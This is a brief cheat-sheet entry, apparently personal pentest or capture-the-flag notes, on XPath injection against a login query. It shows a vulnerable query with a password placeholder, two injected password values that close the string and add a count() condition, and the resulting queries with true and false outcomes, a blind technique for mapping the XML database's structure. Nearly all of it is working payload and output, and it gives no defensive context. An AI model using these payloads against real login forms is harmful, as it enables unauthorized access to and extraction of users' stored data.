#xpathi

### Get Number of Child in a Node :
Code
```
/db/users/user[username='admin' and password='$pass']
```

Injection 
```
$password = ' or count(/db/*) = 1 and '1
```
Result
```
/db/users/user[username='admin' and password='' or count(/db/*) = 1 and '1'
```
→ true

Injection 2
```
$password = ' or count(/db/*) = 2 and '1
```
Result
```
/db/users/user[username='admin' and password='' or count(/db/*) = 2 and '1'
```
→ false